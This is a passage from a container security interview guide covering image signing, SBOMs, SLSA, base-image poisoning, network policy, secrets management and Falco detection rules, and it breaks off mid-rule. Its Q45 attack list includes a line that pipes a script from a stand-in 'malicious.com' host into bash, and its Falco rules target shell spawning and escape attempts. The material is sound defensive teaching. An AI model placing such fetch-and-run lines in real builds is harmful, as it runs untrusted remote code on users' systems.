Developer/CI identity → OIDC token (GitHub Actions, Google, etc.)
     │
     ▼
Fulcio (certificate authority)
     │ Verifies OIDC token, issues short-lived cert (10 min TTL)
     │ Cert contains: subject = OIDC identity, issuer = OIDC provider
     ▼
Cosign signs image digest with ephemeral key
     │ Signature + cert uploaded to Rekor (public, immutable log)
     ▼
Image manifest in registry gets signature annotation
```

**Signing in GitHub Actions:**
```yaml
- name: Sign container image
  run: |
    cosign sign \
      --yes \
      --rekor-url https://rekor.sigstore.dev \
      ${{ env.IMAGE }}@${{ steps.build.outputs.digest }}
  env:
    COSIGN_EXPERIMENTAL: "true"  # keyless mode
```

**Verification:**
```bash
cosign verify \
  --certificate-identity-regexp "https://github.com/myorg/myrepo/.*" \
  --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
  registry.example.com/myimage:v1.0
```

**What this proves:**
- The image was signed by a specific GitHub Actions workflow
- The signing happened after the image digest was computed
- The signature is recorded in a public transparency log (non-repudiation)
- The signing key was ephemeral (no key management burden)

**Limitations:**
- Rekor is public — all your image digests are in the transparency log
- Requires internet access for verification (Rekor API)
- Self-hosted Rekor/Fulcio for air-gapped environments

---

### Q43. What is an SBOM (Software Bill of Materials), and why is it critical for container security?

**Tags:** `SBOM` `SPDX` `CycloneDX` `vulnerability-management` `compliance`

**Answer:**

An **SBOM** is a machine-readable inventory of all software components in an artifact — including packages, libraries, versions, licenses, and their dependency relationships.

**Why SBOMs matter:**
- When a new CVE is published, you can query your SBOMs to find affected images in seconds
- US Executive Order 14028 (May 2021) mandates SBOMs for federal software
- Enables license compliance checking (GPL vs MIT conflicts)
- Foundation for provenance and attestation

**SBOM formats:**

| Format | Maintainer | Best For |
|--------|-----------|----------|
| SPDX | Linux Foundation | License compliance, comprehensive |
| CycloneDX | OWASP | Security-focused, more compact |
| SWID | ISO/IEC | Enterprise software inventory |

**Generating SBOMs:**
```bash
# Syft (anchore) — most comprehensive
syft myimage:latest -o spdx-json=sbom.spdx.json
syft myimage:latest -o cyclonedx-json=sbom.cdx.json

# BuildKit native (Docker 24+)
docker buildx build \
  --attest type=sbom,generator=docker/buildkit-syft-scanner \
  --output type=image,name=myimage:latest .

# Access OCI-attached SBOM
cosign download sbom myimage:latest
```

**Querying SBOMs for vulnerabilities:**
```bash
# Grype uses SBOMs as input
grype sbom:./sbom.spdx.json

# Check if log4j is present anywhere in fleet
cat sbom.spdx.json | jq '.packages[] | select(.name | test("log4j"))'
```

**SBOM in OCI distribution:**
SBOMs can be attached to images as OCI referrers (OCI 1.1 spec):
```bash
cosign attach sbom --sbom sbom.spdx.json myimage:latest
# Stored as separate OCI artifact, linked to image by digest
```

---

### Q44. Explain the SLSA (Supply chain Levels for Software Artifacts) framework in the container context.

**Tags:** `SLSA` `provenance` `build-integrity` `supply-chain`

**Answer:**

**SLSA (pronounced "salsa")** is a security framework with four levels of supply chain integrity guarantees.

**SLSA Levels:**

| Level | Requirements | What it Prevents |
|-------|-------------|-----------------|
| L1 | Build process documented, provenance generated | Retrospective auditing |
| L2 | Hosted build service, signed provenance | Undetected modification after build |
| L3 | Hardened build service, non-falsifiable provenance | Insider threats to build infrastructure |
| L4 | Two-person review, hermetic builds | Compromised build tool |

**SLSA for containers:**

**L1 — Generate provenance:**
```bash
# GitHub Actions + slsa-github-generator
uses: slsa-framework/slsa-github-generator/.github/workflows/container_generator.yml@v1
with:
  image: registry.example.com/myimage
  digest: ${{ steps.build.outputs.digest }}
```

**L2 — Signed provenance from hosted build:**
- Build must run in GitHub Actions / Google Cloud Build / Tekton (hosted, not self-hosted)
- Provenance signed with OIDC identity of the build runner
- Provenance uploaded to Rekor

**L3 — Hardened build environment:**
- Build runs in isolated environment (no network egress by default)
- Build inputs are fully declared
- No interactive access to build process

**Verifying SLSA provenance:**
```bash
slsa-verifier verify-image \
  registry.example.com/myimage@sha256:abc123 \
  --source-uri github.com/myorg/myrepo \
  --source-tag v1.0.0
```

**What provenance contains:**
```json
{
  "buildType": "https://github.com/slsa-framework/slsa-github-generator",
  "builder": { "id": "https://github.com/actions/runner" },
  "invocation": {
    "configSource": {
      "uri": "git+https://github.com/myorg/myrepo",
      "digest": { "sha1": "abc123" },
      "entryPoint": ".github/workflows/build.yml"
    }
  },
  "materials": [
    { "uri": "git+https://github.com/myorg/myrepo", "digest": { "sha1": "abc123" } }
  ]
}
```

---

### Q45. What is a "base image" poisoning attack, and how do you defend against it?

**Tags:** `base-image` `supply-chain` `Dockerfile` `FROM`

**Answer:**

**Base image poisoning:** An attacker compromises a widely-used base image in a public registry (Docker Hub, GitHub Container Registry), injecting malicious code. Every downstream image that `FROM` this base image inherits the malicious layer.

**Attack vectors:**

1. **Registry account compromise:** Attacker gains credentials to `ubuntu`/`node`/`python` official image pusher. Pushes malicious tag.

2. **Tag mutability:** `FROM node:18` is mutable — the image behind that tag can change at any time. Attacker convinces maintainer to accept malicious PR.

3. **Typosquatting:** `FROM nod3:18` (with zero instead of 'o'). Malicious image with plausible name.

4. **Dependency confusion:** If your registry mirrors `docker.io/ubuntu`, can attacker push to your internal registry's `ubuntu` namespace?

5. **Build time code execution:** `RUN curl malicious.com/setup.sh | bash` in a popular base image.

**Defense:**

```dockerfile
# 1. Pin to digest, not tag
FROM ubuntu:22.04@sha256:27cb6e6ccef575a4698b66f5de06c7ecd61589132d5a91d098f7f3f9285415a9

# 2. Use distroless or minimal base images (Google Distroless)
FROM gcr.io/distroless/java17-debian11:nonroot@sha256:...

# 3. Verify base image signature before build
# In CI pipeline:
cosign verify --key keys/official.pub docker.io/ubuntu:22.04
```

```bash
# 4. Use Renovate/Dependabot to track base image updates with review
# Renovate config
{
  "extends": ["config:base"],
  "docker": { "enabled": true },
  "packageRules": [
    { "matchDatasources": ["docker"], "automerge": false }
  ]
}

# 5. Internal registry mirror with allow-list
# Only approved base images can be pulled
# All images scanned before being added to internal mirror

# 6. Admission control: block images from docker.io/* in production
# Only allow images from registry.company.com/*
```

---

### Q46. How do multi-stage Docker builds improve security?

**Tags:** `multi-stage` `attack-surface-reduction` `build-tools` `secrets`

**Answer:**

Multi-stage builds allow using multiple `FROM` instructions, where each stage can copy artifacts from previous stages. The final image contains only what's explicitly copied.

**Security benefits:**

1. **Eliminates build tools from production:**
```dockerfile
# Stage 1: Build
FROM golang:1.22 AS builder
WORKDIR /app
COPY . .
RUN CGO_ENABLED=0 go build -o myapp .

# Stage 2: Production (no Go toolchain, no source code)
FROM scratch
COPY --from=builder /app/myapp /myapp
COPY --from=builder /etc/ssl/certs/ca-certificates.crt /etc/ssl/certs/
USER 65534  # nobody
ENTRYPOINT ["/myapp"]
```

Production image: `myapp` binary + TLS certs + nothing else. No shell, no package manager, no libc (static binary), no gcc. Attack surface is minimal.

2. **Prevents build secret leakage:**
```dockerfile
FROM builder AS build
RUN --mount=type=secret,id=npmrc,target=/root/.npmrc npm ci
# .npmrc (with auth token) never in final image
FROM node:18-alpine
COPY --from=build /app/node_modules ./node_modules
```

3. **Reduces image size** (reduces pull time, smaller attack surface, less to scan):
   - Go app with builder: ~1GB → `scratch`: ~10MB
   - Java app with JDK builder → JRE runtime: 400MB → 120MB

4. **Source code not in production image:**
   - If attacker exploits app and reads filesystem: no source code to analyze for further vulnerabilities

5. **Dependency isolation:**
   - Test dependencies only in test stage
   - Dev tools only in dev stage

**Further hardening with `scratch`:**
```dockerfile
FROM scratch
# No shell → no shell injection via exec
# No package manager → no apt-get install during runtime
# No /bin/sh → `docker exec` fails (good for production)
```

---

### Q47. What is "image scanning" vs. "image analysis" vs. "runtime security"? How do they complement each other?

**Tags:** `scanning` `runtime-security` `shift-left` `defense-in-depth`

**Answer:**

These are three distinct but complementary security activities:

**Image Scanning (Static Analysis — Pre-Deployment):**
- Analyzes image layers before the image is deployed
- Identifies known CVEs in OS packages and application dependencies
- Checks for hardcoded secrets, misconfigurations
- Tools: Trivy, Grype, Snyk, Docker Scout, Clair
- Limitations: Only finds known issues (CVEs must be in database), cannot detect logic bugs or zero-days

```bash
trivy image myimage:latest \
  --severity HIGH,CRITICAL \
  --exit-code 1 \
  --ignore-unfixed
```

**Image Analysis (Deep Static — Pre-Deployment):**
- Goes beyond CVE scanning
- Checks Dockerfile best practices (CIS, NIST)
- Detects setuid binaries, world-writable files, shells
- Identifies unnecessary capabilities
- Tools: Dockle, Hadolint, Conftest, Checkov

```bash
dockle --exit-code 1 --exit-level warn myimage:latest
hadolint Dockerfile
```

**Runtime Security (Dynamic — In-Deployment):**
- Monitors container behavior during execution
- Detects anomalous syscalls, network connections, file access
- Identifies zero-day exploitation, post-compromise behavior
- Tools: Falco, Tetragon, Aqua, Sysdig Secure
- Limitations: Generates false positives, requires tuning, reactive not preventive

```yaml
# Falco rule example
- rule: Unexpected outbound connection
  condition: outbound and container and not expected_outbound_destinations
  output: Unexpected connection (container=%container.name dest=%fd.rip)
  priority: WARNING
```

**Layered Defense:**
```
[Code] → [Build] → [Registry] → [Deploy] → [Runtime]
  ↑          ↑           ↑           ↑          ↑
 SAST     Dockerfile   Image       Admission  Falco/
 tools    linting      scanning    control    Tetragon
```

---

### Q48. What are "distroless" images, and what security properties do they provide?

**Tags:** `distroless` `minimal-image` `attack-surface` `Google`

**Answer:**

**Distroless images** (Google) contain only the application and its runtime dependencies — no package manager, no shell, no OS utilities (no `ls`, `cat`, `curl`, `bash`).

**Available base images:**
- `gcr.io/distroless/static` — for statically compiled binaries (Go)
- `gcr.io/distroless/base` — glibc, libssl, openssl
- `gcr.io/distroless/java17` — Java 17 JRE
- `gcr.io/distroless/nodejs20` — Node.js 20 runtime
- `gcr.io/distroless/python3` — Python 3 interpreter
- All available in `:nonroot` variant (runs as UID 65532 by default)

**Security properties:**

1. **No shell:** `docker exec <container> /bin/sh` fails. Post-exploitation shell access is blocked. Attackers must use the application's own binaries (living off the land is harder).

2. **No package manager:** Cannot `apt-get install` tools post-compromise.

3. **No debugging tools:** No `strace`, `gdb`, `curl`, `wget`. Makes attacker's job harder.

4. **Minimal CVE surface:** Fewer packages = fewer CVEs. Typical distroless has ~10-20 packages; Ubuntu has ~200+.

5. **Reduced Falco noise:** With fewer binaries available, anomaly detection is more effective (any unexpected process spawn is suspicious).

**Tradeoff:**
```dockerfile
FROM golang:1.22 AS builder
RUN go build -o app .

FROM gcr.io/distroless/static-debian12:nonroot
COPY --from=builder /app/app /app
ENTRYPOINT ["/app"]
# Debugging is harder — need ephemeral debug containers
# kubectl debug -it <pod> --image=busybox --target=mycontainer
```

**Debugging distroless in production:**
```bash
kubectl debug -it mypod \
  --image=busybox \
  --target=mycontainer \
  --copy-to=debug-pod
```

---

### Q49. How do you implement a secure image promotion pipeline?

**Tags:** `image-promotion` `registry` `CI/CD` `gate`

**Answer:**

**Image promotion** is the practice of moving an image through stages (dev → staging → production) based on security gates passing.

**Secure promotion pipeline:**

```
Build → Dev Registry → [Gate 1] → Staging Registry → [Gate 2] → Production Registry
         ↓                              ↓                              ↓
     (unverified)               (scan-verified)              (scan+sign+policy verified)
```

**Gate 1 — Automated security checks:**
```bash
#!/bin/bash
IMAGE=$1

# 1. CVE scan - fail on HIGH/CRITICAL
trivy image --exit-code 1 --severity HIGH,CRITICAL $IMAGE

# 2. Secret scan
trufflehog docker --image $IMAGE --fail

# 3. Dockerfile compliance
dockle --exit-code 1 $IMAGE

# 4. SBOM generation
syft $IMAGE -o spdx-json > sbom.json

# 5. Sign the image
cosign sign --yes $IMAGE

# 6. If all pass: promote to staging
docker tag $IMAGE staging-registry.example.com/${IMAGE##*/}
docker push staging-registry.example.com/${IMAGE##*/}
```

**Gate 2 — Pre-production checks:**
```bash
# 1. Integration/e2e test results verified
# 2. Penetration test sign-off
# 3. Change management approval
# 4. Re-verify signature (image not tampered since staging)
cosign verify --key keys/prod.pub staging-registry.example.com/myimage:v1.0

# 5. OPA policy check
conftest test --policy policies/production.rego sbom.json

# 6. Promote
docker tag ... production-registry.example.com/myimage:v1.0
cosign sign --key keys/prod.key production-registry.example.com/myimage:v1.0
```

**Kubernetes admission enforcement:**
```yaml
# Only allow images from prod registry, signed by prod key
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: verify-image-signature
spec:
  rules:
  - name: check-image-signature
    match:
      resources: { kinds: ["Pod"] }
    verifyImages:
    - imageReferences: ["production-registry.example.com/*"]
      attestors:
      - entries:
        - keyless:
            subject: "https://github.com/myorg/myrepo/.*"
            issuer: "https://token.actions.githubusercontent.com"
```

---

### Q50. What is registry security, and how do you harden a private container registry?

**Tags:** `registry-security` `Harbor` `RBAC` `TLS` `vulnerability-scanning`

**Answer:**

**Registry threats:**
- Unauthenticated access (pull/push without auth)
- MITM attacks during push/pull
- Malicious image injection
- Unauthorized image deletion
- Registry as pivot point for lateral movement
- Credential exfiltration

**Private registry options (self-hosted):**
- **Harbor** (CNCF) — most feature-rich, includes scanning, replication, RBAC
- **Zot** — OCI-native, lightweight
- **Quay** (RedHat) — enterprise features

**Harbor security hardening:**

```yaml
# Harbor components and security measures
authentication:
  mode: OIDC  # SSO via corporate IdP, not local users
  oidc_provider: https://sso.example.com
  oidc_scope: "openid,email,profile,groups"

authorization:
  project_roles:
    - Limited Guest (pull only, no image list)
    - Developer (push to dev projects)
    - Maintainer (push/delete, manage tags)
    - Admin (project management)

vulnerability_scanning:
  scanner: Trivy
  scan_on_push: true
  prevent_vulnerable_running_images:
    severity: HIGH  # Block pull if HIGH+ CVEs unfixed

content_trust:
  enable_content_trust: true
  require_signatures: true

image_proxy:
  enable: true  # Proxy hub.docker.com through Harbor
  use_http: false

replication:
  mode: push  # Not pull - control data flow direction
  tls_verify: true

database:
  ssl_mode: require

core:
  secret_key: <32-byte-random>

tls:
  certificate: /certs/harbor.crt
  private_key: /certs/harbor.key
  min_version: TLSv1.2

network:
  # Harbor should only be accessible from:
  # - CI/CD systems
  # - Kubernetes nodes
  # - Developer VPN
```

**Network-level hardening:**
```bash
# Restrict registry access to known CIDRs only
# Never expose registry publicly (use pull-through cache for public images)
# Enable audit logging: all push/pull/delete operations logged
# Regular backup of Harbor database (contains all image metadata)
```

---

## Section 5: Network Security

---

### Q51. Explain Docker's networking model and the security implications of each network mode.

**Tags:** `docker-networking` `bridge` `host` `overlay` `network-isolation`

**Answer:**

**Docker network modes:**

| Mode | Flag | Isolation | Use Case | Security Risk |
|------|------|-----------|----------|---------------|
| `bridge` (default) | `--network bridge` | Separate network namespace, NAT to host | General purpose | Inter-container communication via `docker0` |
| `host` | `--network host` | No network namespace, shares host interfaces | Performance-critical | Container binds host ports directly, sees all interfaces |
| `none` | `--network none` | No network interface | Maximum isolation | None (best) |
| `overlay` | Swarm/user-defined | Multi-host encrypted overlay | Multi-host | Requires VXLAN, encryption optional |
| `macvlan` | `--network macvlan` | Container gets MAC address on physical network | L2 access | Container appears as physical host |
| `ipvlan` | `--network ipvlan` | Container shares host MAC | IoT, legacy | Less isolated than macvlan |
| `container:<id>` | `--network container:xxx` | Shares another container's network namespace | Sidecar pattern | Shared network = no L3 isolation between them |

**`bridge` mode security:**
```bash
# Docker creates docker0 bridge (172.17.0.0/16 by default)
# iptables rules NAT container traffic to host IP
# By default ICC (Inter-Container Communication) is ENABLED on default bridge
# Any container can talk to any other container!

# Fix: use user-defined bridges (ICC disabled between different bridges)
docker network create --internal myapp-network
docker run --network myapp-network myapp

# Or globally disable ICC
{ "icc": false }  # daemon.json
```

**`host` mode risks:**
```bash
docker run --network host nginx
# nginx binds to 0.0.0.0:80 on HOST
# Container can see all host network interfaces
# Can bind any port (including system ports if CAP_NET_BIND_SERVICE)
# Can sniff host network traffic with CAP_NET_RAW
# Bypass all network isolation
```

**User-defined bridge advantages:**
- Automatic DNS between containers by name
- ICC disabled between different user-defined networks
- `--internal` flag: no external connectivity
- Better isolation than default bridge

---

### Q52. How does Docker handle iptables, and what are the security implications?

**Tags:** `iptables` `NAT` `DOCKER-USER` `firewall`

**Answer:**

Docker manipulates `iptables` directly to implement container networking. This creates security gotchas for operators who also manage `iptables` for host security.

**Docker iptables chains:**

```
INPUT chain:
  └── Host traffic

FORWARD chain:
  ├── DOCKER-USER      ← Admin-controlled (persistent)
  ├── DOCKER-ISOLATION-STAGE-1
  │   └── DOCKER-ISOLATION-STAGE-2
  └── DOCKER          ← Docker-managed (reset on daemon restart)

POSTROUTING:
  └── MASQUERADE      ← SNAT for container outbound traffic
```

**Critical security issue: Docker bypasses UFW/firewalld:**
```bash
# User adds UFW rule to block external access to port 8080
ufw deny 8080

# But runs container:
docker run -p 8080:80 nginx

# Docker adds iptables rule BEFORE UFW rules:
# DOCKER chain: DNAT to container
# UFW rule never evaluated!
# Container is externally accessible despite UFW block
```

**Fix — Use `DOCKER-USER` chain:**
```bash
# Rules in DOCKER-USER are evaluated before DOCKER chain
# Persist across Docker restarts

# Block external access to container port
iptables -I DOCKER-USER -p tcp --dport 8080 -j DROP
iptables -I DOCKER-USER -p tcp --dport 8080 -s 10.0.0.0/8 -j ACCEPT

# Save
iptables-save > /etc/iptables/rules.v4
```

**Disable Docker iptables management (advanced):**
```json
// daemon.json
{ "iptables": false }
// You must then manage all container networking rules manually
```

**IPv6:** Docker has historically had poor IPv6 support. Container traffic may bypass `ip6tables` rules. Verify with:
```bash
ip6tables -L -n | grep DOCKER
```

---

### Q53. What is container network policy, and how is it implemented?

**Tags:** `NetworkPolicy` `Kubernetes` `Calico` `Cilium` `micro-segmentation`

**Answer:**

**Container network policy** (Kubernetes `NetworkPolicy`) defines what network traffic is allowed to/from pods. By default, all pods can communicate with all other pods — network policy adds restrictions.

**Default behavior:** No NetworkPolicy = allow all ingress + egress between all pods in cluster.

**Kubernetes NetworkPolicy:**
```yaml
# Deny all ingress by default (start restrictive)
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-all-ingress
  namespace: production
spec:
  podSelector: {}  # Applies to all pods
  policyTypes:
  - Ingress
  # No ingress rules = deny all

---
# Allow specific ingress
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-frontend-to-backend
spec:
  podSelector:
    matchLabels:
      app: backend
  policyTypes:
  - Ingress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: frontend
    ports:
    - protocol: TCP
      port: 8080
```

**CNI plugins that implement NetworkPolicy:**
- **Calico:** iptables/eBPF, supports GlobalNetworkPolicy (cluster-wide), L7 policy
- **Cilium:** eBPF-native, L3/L4/L7, DNS-aware policy, CiliumNetworkPolicy
- **Weave:** iptables-based
- **kube-router:** iptables + BGP

**Important:** `NetworkPolicy` is only enforced if a supporting CNI is installed. With `kubenet` (default on some clusters), `NetworkPolicy` objects exist but are NOT enforced.

**Cilium L7 policy (HTTP-aware):**
```yaml
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
spec:
  endpointSelector:
    matchLabels:
      app: backend
  ingress:
  - fromEndpoints:
    - matchLabels:
        app: frontend
    toPorts:
    - ports:
      - port: "8080"
      rules:
        http:
        - method: "GET"
          path: "/api/.*"
        # Blocks POST/DELETE/etc
```

---

### Q54. Explain TLS termination patterns in containerized environments and their security tradeoffs.

**Tags:** `TLS` `mTLS` `service-mesh` `ingress` `certificate-management`

**Answer:**

**TLS termination patterns:**

**1. Edge termination (Ingress/Load Balancer):**
```
External Client → [TLS] → Ingress Controller → [HTTP] → Container
```
- TLS terminated at ingress (nginx, Traefik, ALB)
- Traffic between ingress and pod is plaintext within cluster
- Simpler certificate management
- Risk: Attacker on cluster network can intercept pod-to-pod traffic

**2. Passthrough:**
```
External Client → [TLS] → Ingress (passthrough) → [TLS] → Container
```
- TLS not terminated by ingress — forwarded to pod
- Pod handles TLS termination
- More complex: pod needs TLS cert management
- Benefit: End-to-end encryption

**3. Re-encryption:**
```
External Client → [TLS cert A] → Ingress → [TLS cert B] → Container
```
- Ingress terminates external TLS, re-establishes TLS to pod
- Different certs for external and internal

**4. mTLS (Service Mesh — Istio/Linkerd):**
```
Container A → [mTLS - cert A] → Sidecar Proxy A → [mTLS] → Sidecar Proxy B → Container B
```
- Mutual authentication — both parties present certificates
- Automatic certificate rotation (SVID via SPIFFE)
- Zero-trust within cluster: no implicit trust between services
- Policy: only `service-a` with cert proving identity can call `service-b`

**Certificate management for containers:**

```bash
# cert-manager (Kubernetes)
# Automatically issues/renews Let's Encrypt or private CA certs
apiVersion: cert-manager.io/v1
kind: Certificate
metadata:
  name: myapp-tls
spec:
  secretName: myapp-tls-secret
  issuerRef:
    name: letsencrypt-prod
    kind: ClusterIssuer
  dnsNames:
  - myapp.example.com
  duration: 2160h  # 90 days
  renewBefore: 720h  # Renew 30 days before expiry
```

**SPIFFE/SPIRE for workload identity:**
- Each pod gets a cryptographic identity (SVID = SPIFFE Verifiable Identity Document)
- Identity based on pod's service account + namespace + cluster
- No static credentials needed
- Used by Istio, Linkerd, Consul Connect

---

### Q55. How do you prevent DNS-based attacks in containerized environments?

**Tags:** `DNS` `CoreDNS` `DNS-rebinding` `DNS-exfiltration`

**Answer:**

**DNS attack vectors in containers:**

1. **DNS rebinding:** Attacker controls domain, changes DNS TTL to 0, alternates resolution between public IP and internal container/service IP. Bypasses same-origin policy.

2. **DNS exfiltration:** Malicious container encodes data in DNS queries to attacker-controlled domain. Bypasses network egress controls (port 53 usually allowed).

3. **CoreDNS attacks:** Malicious pod queries CoreDNS for internal service discovery (kubernetes.default.svc.cluster.local) — reconnaissance.

4. **Wildcard DNS pollution:** If a container can influence CoreDNS configuration (via ConfigMap), it could redirect DNS for other services.

5. **Amplification via CoreDNS:** CoreDNS used as DNS amplification target from compromised container.

**Mitigations:**

```yaml
# 1. Restrict DNS egress in NetworkPolicy
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: restrict-dns-egress
spec:
  podSelector: {}
  policyTypes:
  - Egress
  egress:
  - to:
    - namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: kube-system
    ports:
    - protocol: UDP
      port: 53
    - protocol: TCP
      port: 53
  # All other DNS egress blocked (blocks DNS exfiltration to external)
```

```yaml
# 2. CoreDNS policy plugin (restrict internal DNS to authorized namespaces)
# CoreDNS Corefile
.:53 {
  kubernetes cluster.local in-addr.arpa ip6.arpa {
    pods insecure
    fallthrough in-addr.arpa ip6.arpa
  }
  # Block queries for internal zones from outside cluster
  acl {
    allow type A net 10.0.0.0/8
    block
  }
}
```

```bash
# 3. DNS-aware network policy (Cilium)
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
spec:
  endpointSelector: {}
  egress:
  - toFQDNs:
    - matchPattern: "*.amazonaws.com"
    - matchName: "api.github.com"
    # Only allow egress DNS to known domains
```

---

## Section 6: Secrets & Credential Management

---

### Q56. What are the methods for injecting secrets into containers, and what are the security tradeoffs of each?

**Tags:** `secrets-management` `environment-variables` `Vault` `CSI-driver`

**Answer:**

**Method 1: Environment Variables**
```dockerfile
docker run -e DB_PASSWORD=secret myapp
```
Risks:
- Visible in `docker inspect`, `/proc/<pid>/environ`, `ps auxe`
- Logged by mistake in stack traces
- Available to ALL processes in container
- Inherited by child processes

**Method 2: Docker Secrets (Swarm) / Kubernetes Secrets**
```bash
# Docker Swarm
echo "mysecret" | docker secret create db_password -
# Mounted as tmpfs at /run/secrets/db_password

# Kubernetes
kubectl create secret generic db-creds --from-literal=password=secret
```
Risks in Kubernetes:
- Base64-encoded in etcd (not encrypted by default!)
- Any pod in same namespace can read secrets (if RBAC not configured)
- Node can access all secrets of pods scheduled on it

**Enable etcd encryption (Kubernetes):**
```yaml
apiVersion: apiserver.config.k8s.io/v1
kind: EncryptionConfiguration
resources:
- resources:
  - secrets
  providers:
  - aescbc:
      keys:
      - name: key1
        secret: <base64-encoded-32-byte-key>
  - identity: {}
```

**Method 3: Vault Agent Sidecar Injection**
```yaml
# Vault Agent reads dynamic secrets from Vault, writes to shared tmpfs
# App reads from file — no hardcoded credentials
annotations:
  vault.hashicorp.com/agent-inject: "true"
  vault.hashicorp.com/agent-inject-secret-db: "database/creds/myapp"
  vault.hashicorp.com/role: "myapp"
```
Benefits: Dynamic credentials, auto-renewal, audit trail per access.

**Method 4: CSI Secret Store Driver**
```yaml
apiVersion: secrets-store.csi.x-k8s.io/v1
kind: SecretProviderClass
metadata:
  name: aws-secrets
spec:
  provider: aws
  parameters:
    objects: |
      - objectName: "prod/myapp/db-password"
        objectType: "secretsmanager"
```
Mounts secrets from AWS Secrets Manager, Azure Key Vault, GCP Secret Manager directly into pod filesystem. No static credentials on cluster.

**Security ranking (best to worst):**
1. Workload identity (IRSA/Workload Identity) — no credentials at all
2. CSI Secret Store Driver — credentials from external vault
3. Vault Agent Sidecar — dynamic credentials
4. Kubernetes Secrets with etcd encryption + strict RBAC
5. Docker Secrets (Swarm)
6. Files mounted via volumes
7. Environment variables (avoid)
8. Baked into image (never)

---

### Q57. How do you detect and prevent secrets being baked into container images?

**Tags:** `secrets-in-images` `pre-commit` `trufflehog` `git-history`

**Answer:**

**Why this happens:**
- Developers run `docker build` with API keys in ARG
- `COPY .env .` includes local secrets file
- `git clone` of private repo requires credentials in RUN step
- Multi-layer Docker builds — deleted files still in lower layers

**Detection:**

```bash
# Scan image for secrets (all layers)
trufflehog docker --image myimage:latest --json

# docker-scan (Snyk) secret detection
docker scan myimage:latest

# detect-secrets (Yelp)
# Scan extracted layer contents
mkdir /tmp/layers
docker save myimage:latest | tar -C /tmp/layers -xf -
find /tmp/layers -name "layer.tar" -exec tar -xOf {} \; | \
  detect-secrets scan --baseline .secrets.baseline

# Inspect Docker history for secrets in commands
docker history --no-trunc myimage:latest | grep -iE '(password|secret|key|token|api)'

# Image metadata inspection
docker inspect myimage:latest | jq '.[].Config.Env'
```

**Prevention in Dockerfile:**
```dockerfile
# WRONG — secret in build ARG (visible in image metadata)
ARG NPM_TOKEN
RUN npm install

# WRONG — even if you delete it, it's in the layer
RUN echo "//registry.npmjs.org/:_authToken=${NPM_TOKEN}" > ~/.npmrc && \
    npm install && \
    rm ~/.npmrc

# CORRECT — BuildKit secret mount (never in any layer)
# syntax=docker/dockerfile:1
RUN --mount=type=secret,id=npmrc,target=/root/.npmrc \
    npm install
```

**Prevention in CI/CD:**
```yaml
# Pre-commit hook
repos:
- repo: https://github.com/trufflesecurity/trufflehog
  hooks:
  - id: trufflehog
    args: ['git', 'file://.', '--since-commit', 'HEAD', '--fail']

# GitHub Advanced Security secret scanning
# Automatically scans all pushed commits
# Can block push if secret detected (push protection)
```

**Registry-level detection:**
```bash
# Harbor with Trivy scanner detects secrets in images during push
# Block push if secrets detected
```

---

### Q58. Explain the security model of Kubernetes Secrets. What are their weaknesses, and how do you strengthen them?

**Tags:** `Kubernetes-secrets` `etcd` `RBAC` `KMS` `external-secrets`

**Answer:**

**Kubernetes Secret weaknesses:**

1. **Base64 is not encryption:** `kubectl get secret mysecret -o yaml` shows base64 values — trivially decodable.

2. **etcd stores secrets unencrypted by default:** Anyone with etcd access (or etcd backup) has all secrets in plaintext.

3. **Overly broad RBAC:** `get secrets` permission in a namespace = access to all secrets in that namespace.

4. **Node-level access:** kubelet on a node can access all secrets of pods scheduled on that node.

5. **Logged in API server audit logs:** `kubectl get secret` is logged, but the secret VALUE is not — however, `kubectl describe` prints annotations.

6. **In-memory in kubelet:** Secrets are stored in kubelet's memory and possibly written to tmpfs.

**Strengthening:**

```bash
# 1. Enable etcd encryption at rest (KMS provider — strongest)
# /etc/kubernetes/encryption-config.yaml
apiVersion: apiserver.config.k8s.io/v1
kind: EncryptionConfiguration
resources:
- resources: ["secrets"]
  providers:
  - kms:
      name: aws-encryption-provider
      endpoint: unix:///var/run/kmsplugin/socket.sock
      cachesize: 1000
      timeout: 3s
  - identity: {}
# kube-apiserver: --encryption-provider-config=/etc/kubernetes/encryption-config.yaml
```

```yaml
# 2. Strict RBAC — least privilege
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: app-secrets-reader
rules:
- apiGroups: [""]
  resources: ["secrets"]
  resourceNames: ["myapp-db-creds"]  # Only THIS specific secret
  verbs: ["get"]
# NOT: resources: ["secrets"] verbs: ["get", "list", "watch"] -- too broad
```

```bash
# 3. Replace Kubernetes Secrets with External Secrets Operator
# Syncs secrets from AWS Secrets Manager / Vault / GCP into Kubernetes Secrets
# Source of truth is external — Kubernetes Secret is ephemeral

# 4. Use sealed-secrets (Bitnami) for GitOps
kubeseal < secret.yaml > sealed-secret.yaml
# SealedSecret encrypted with cluster public key
# Only cluster controller can decrypt
# Safe to commit to Git
```

---

## Section 7: Runtime Threat Detection

---

### Q59. How does Falco detect container threats, and how do you write effective Falco rules?

**Tags:** `Falco` `runtime-security` `eBPF` `syscall-detection`

**Answer:**

**Falco** is a cloud-native runtime security tool that uses eBPF (or kernel module) to monitor system calls and Kubernetes API events.

**Architecture:**
```
Container Process → syscall → eBPF probe (in kernel) → Falco daemon (userspace)
                                                             │
                                              Policy evaluation (Lua/YAML rules)
                                                             │
                                        Alert → Slack/PagerDuty/Falcosidekick
```

**Rule structure:**
```yaml
- rule: Shell in Container
  desc: >
    Detect shell execution inside a container. 
    Legitimate apps shouldn't need shells at runtime.
  condition: >
    spawned_process
    and container
    and container.image.repository != "debug-tools"
    and proc.name in (shell_binaries)
    and not proc.pname in (shell_spawning_binaries)
  output: >
    Shell execution in container 
    (user=%user.name container=%container.name 
     image=%container.image.repository 
     cmd=%proc.cmdline parent=%proc.pname)
  priority: WARNING
  tags: [container, shell, mitre_execution]
```

**High-value rules:**
```yaml
# 1. Container escape attempt
- rule: Namespace Escape Attempt
  condition: >
    syscall.type = unshare and container
    and evt.arg.flags contains CLONE_NEWNS
  priority: CRITICAL

# 2. Unexpected outbound connection
- rule: Unexpected Network Connection
  condition: >
    outbound and container
    and not fd.sport in (allowed_ports)
